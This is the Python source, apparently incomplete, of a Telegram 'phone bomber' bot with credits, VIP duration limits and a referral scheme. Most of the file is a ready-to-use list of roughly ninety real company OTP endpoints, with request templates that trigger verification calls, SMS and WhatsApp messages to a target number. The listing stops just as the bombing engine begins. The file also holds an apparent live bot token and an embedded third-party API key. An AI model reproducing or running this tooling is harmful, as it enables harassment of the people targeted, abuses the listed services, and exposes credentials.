# -*- coding: utf-8 -*-
"""
ULTIMATE TELEGRAM BOMBER BOT V3.1 - WITH VIP DURATION GATES
Bot by @NotYoursNaruto | Made by Naruto
Shadow Cat Industries - Classified
"""

import asyncio
import aiohttp
import time
import random
import json
import sqlite3
import os
import sys
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============= CONFIGURATION =============
BOT_TOKEN = "8940969112:AAGLNZK7nxxiZoEw3J2jU1g2jySQjUXbq9k"  # REPLACE WITH YOUR TOKEN
BOT_OWNER = "NotYoursNaruto"  # Your username
BOT_NAME = "ULTIMATE PHONE DESTROYER"
VERSION = "V3.1"
ADMIN_IDS = [8206978592]  # Add your admin user IDs here
DEFAULT_CREDITS = 5  # Free credits for new users
BOMB_COST = 1  # Credits per bomb session
VIP_USERS = []  # VIP user IDs get unlimited bombing
REFERRAL_BONUS = 2  # Credits for referring someone

# ===== VIP DURATION GATES =====
MAX_DURATION_FREE = 45      # non-VIP hard cap (seconds)
MAX_DURATION_VIP = 3600     # VIP sanity cap (1 hour)
DEFAULT_DURATION = 60       # fallback if arg missing

# ============= ANIMATED EMOJI CONFIGURATION =============
ANIMATED_EMOJIS = {
    # Action Emojis
    "🚀": "5258332798409783582",  # Rocket
    "💥": "5888974760720732797",  # Explosion
    "💣": "5134377151734219769",  # Bomb
    "⚡": "5843553939672274145",  # Lightning
    "🔥": "6053166094816905153",  # Fire
    "💀": "6188110286470253001",  # Skull
    "🎯": "5310278924616356636",  # Target
    "⏰": "5985616167740379273",  # Clock
    "🛑": "5296258510684712098",  # Stop
    "🔄": "5877410604225924969",  # Loading

    # Credit Emojis
    "💰": "5778311685638984859",  # Money
    "🎁": "6032937473162614352",  # Gift
    "💳": "5936017305585586269",  # Credit Card
    "📊": "5931472654660800739",  # Chart
    "🏆": "5312160339335347417",  # Trophy
    "👑": "5373346752671804066",  # Crown
    "💎": "6028530359975548369",  # Diamond

    # User Emojis
    "👋": "5994750571041525522",  # Wave
    "👤": "5879770735999717115",  # User
    "👥": "5942877472163892475",  # People
    "🎉": "5994502837327892086",  # Party
    "🏅": "5444931419270839381",  # Medal

    # Bombing Types
    "📞": "5897488197650223178",  # Phone Call
    "📱": "5985833664884250583",  # Mobile
    "💬": "5884510167986343350",  # Chat
    "📨": "5985817223749439505",  # Envelope

    # Status Emojis
    "✅": "5776375003280838798",  # Check
    "❌": "5778527486270770928",  # Cross
    "⚠️": "5420323339723881652",  # Warning
    "🚨": "6073511595416228178",  # Alarm
    "📢": "5771695636411847302",  # Megaphone
    "🔔": "5909201569898827582",  # Bell
    "📖": "5778184941154078090",  # Book

    # Interface
    "⬅️": "5832251986635920010",  # Back Arrow
    "🔮": "5460980668378931880",  # Crystal
    "🔒": "5348254206414785133",  # Lock
}

def e(text: str) -> str:
    """Replace standard emojis with Telegram premium animated emoji syntax."""
    for emoji, animated_id in ANIMATED_EMOJIS.items():
        if emoji in text:
            text = text.replace(emoji, f"<tg-emoji emoji-id=\"{animated_id}\">{emoji}</tg-emoji>")
    return text

# ============= DATABASE SETUP =============
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('bomber_bot.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self._create_tables()

    def _create_tables(self):
        """Create necessary tables"""
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                credits INTEGER DEFAULT 0,
                total_bombs INTEGER DEFAULT 0,
                total_success INTEGER DEFAULT 0,
                join_date TEXT,
                is_vip INTEGER DEFAULT 0,
                referred_by INTEGER DEFAULT NULL,
                referral_count INTEGER DEFAULT 0,
                first_name TEXT
            )
        ''')

        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount INTEGER,
                type TEXT,
                description TEXT,
                timestamp TEXT
            )
        ''')

        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referee_id INTEGER,
                bonus_claimed INTEGER DEFAULT 0,
                timestamp TEXT
            )
        ''')

        # Protected numbers table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS protected_numbers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT UNIQUE,
                label TEXT DEFAULT 'Owner',
                added_on TEXT
            )
        ''')

        self.conn.commit()
        # migrate existing DBs that predate the first_name column
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN first_name TEXT")
            self.conn.commit()
        except Exception:
            pass  # column already exists

    def get_user(self, user_id):
        """Get user data or create if not exists"""
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = self.cursor.fetchone()

        if not user:
            self.cursor.execute('''
                INSERT INTO users (user_id, credits, join_date)
                VALUES (?, ?, ?)
            ''', (user_id, DEFAULT_CREDITS, datetime.now().isoformat()))
            self.conn.commit()
            self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
            user = self.cursor.fetchone()

        return user

    def update_profile(self, user_id, username, first_name):
        """Keep username + first_name fresh on every interaction."""
        self.cursor.execute(
            "UPDATE users SET username=?, first_name=? WHERE user_id=?",
            (username, first_name, user_id)
        )
        self.conn.commit()

    def get_credits(self, user_id):
        """Get user credits"""
        user = self.get_user(user_id)
        return user[2] if user else 0

    def add_credits(self, user_id, amount, description=""):
        """Add credits to user"""
        self.cursor.execute('''
            UPDATE users SET credits = credits + ? WHERE user_id = ?
        ''', (amount, user_id))
        self.cursor.execute('''
            INSERT INTO transactions (user_id, amount, type, description, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, amount, "ADD", description, datetime.now().isoformat()))
        self.conn.commit()
        return True

    def remove_credits(self, user_id, amount, description=""):
        """Remove credits from user"""
        current = self.get_credits(user_id)
        if current < amount:
            return False

        self.cursor.execute('''
            UPDATE users SET credits = credits - ? WHERE user_id = ?
        ''', (amount, user_id))
        self.cursor.execute('''
            INSERT INTO transactions (user_id, amount, type, description, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, -amount, "REMOVE", description, datetime.now().isoformat()))
        self.conn.commit()
        return True

    def is_vip(self, user_id):
        """Check if user is VIP"""
        user = self.get_user(user_id)
        return user[6] == 1 if user else False

    def get_top_users(self, limit=10):
        """Get top users by credits"""
        self.cursor.execute('''
            SELECT user_id, username, first_name, credits, total_bombs, total_success
            FROM users
            ORDER BY credits DESC
            LIMIT ?
        ''', (limit,))
        return self.cursor.fetchall()

    def get_stats(self):
        """Get bot stats"""
        self.cursor.execute('SELECT COUNT(*) FROM users')
        total_users = self.cursor.fetchone()[0]

        self.cursor.execute('SELECT SUM(total_bombs) FROM users')
        total_bombs = self.cursor.fetchone()[0] or 0

        self.cursor.execute('SELECT SUM(total_success) FROM users')
        total_success = self.cursor.fetchone()[0] or 0

        self.cursor.execute('SELECT SUM(referral_count) FROM users')
        total_referrals = self.cursor.fetchone()[0] or 0

        return {
            "total_users": total_users,
            "total_bombs": total_bombs,
            "total_success": total_success,
            "total_referrals": total_referrals
        }

    # Protected number methods
    def add_protected_number(self, user_id, phone_number, label="Owner"):
        """Add a protected number for a user"""
        self.cursor.execute('''
            INSERT OR REPLACE INTO protected_numbers (user_id, phone, label, added_on)
            VALUES (?, ?, ?, ?)
        ''', (user_id, phone_number, label, datetime.now().isoformat()))
        self.conn.commit()

    def get_protected_numbers(self, user_id=None):
        """Get protected numbers for a user or all"""
        if user_id:
            self.cursor.execute('SELECT phone, label FROM protected_numbers WHERE user_id = ?', (user_id,))
        else:
            self.cursor.execute('SELECT user_id, phone, label FROM protected_numbers')
        return self.cursor.fetchall()

    def is_number_protected(self, phone):
        """Check if a phone number is protected"""
        self.cursor.execute('SELECT user_id, label FROM protected_numbers WHERE phone = ?', (phone,))
        return self.cursor.fetchone()

    def remove_protected_number(self, phone):
        """Remove a protected number"""
        self.cursor.execute('DELETE FROM protected_numbers WHERE phone = ?', (phone,))
        self.conn.commit()
        return self.cursor.rowcount > 0

    def close(self):
        self.conn.close()

# ============= DATABASE INSTANCE =============
db = Database()

def display_name(uid: int, username, first_name) -> str:
    """@username if set, else a tappable HTML mention using first_name."""
    if username:
        return f"@{username}"
    name = first_name or str(uid)
    return f'<a href="tg://user?id={uid}">{name}</a>'

# ============= ULTIMATE APIS =============
ULTIMATE_APIS = [
    # CALL BOMBING APIS
    {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"name": "MakeMyTrip Voice Call", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Goibibo Voice Call", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    # WHATSAPP BOMBING APIS
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
    # SMS BOMBING APIS
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobiles={phone}&resend=Resend"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'},
    {"name": "Univest", "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"contact_no":"{phone}"}}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"check_mobile_number=1&contact={phone}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile_no=%2B91{phone}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobilenumber={phone}&otptype=register"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BigCash", "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'},
    {"name": "WorkIndia", "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f'method=firstRegisterApi&data={{"customerMobile":"{phone}","generateOtp":"true"}}'},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Vyapar", "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'},
    {"name": "MyGov", "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male", "method": "GET", "headers": {}, "data": None},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'},
    {"name": "CodFirm", "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'},
    {"name": "AstroSage", "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}'},
    {"name": "ConfirmTkt", "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}", "method": "GET", "headers": {}, "data": None},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'},
    {"name": "Nuvama Wealth", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
]

# ============= BOMBER ENGINE =============
class TelegramBomber:
    def __init__(self):
        self.active_jobs = {}
        self.bomb_stats = {}
        self._lock = asyncio.Lock()

    async def bomb_phone(self, phone, duration=60):
        """Ultimate phone bombing"""
        job_id = f"{phone}_{int(time.time())}"

